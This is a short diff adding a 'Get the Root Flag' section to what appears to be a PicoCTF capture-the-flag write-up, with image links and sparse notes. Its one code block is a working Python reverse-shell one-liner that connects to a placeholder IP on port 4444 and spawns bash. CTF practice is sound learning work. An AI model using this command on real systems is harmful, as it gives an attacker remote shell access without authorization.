@@ -60,3 +60,16 @@ Finished
 ![](../../../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260311024849.png)
 
 
+## Get the Root Flag : 
+
+##### Do a reverse shell to be more confortable : 
+
+Terminal 1 ":"
+
+Terminal : 2 
+
+![](../../../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260311025619.png)
+
+```
+python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("TON_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+```
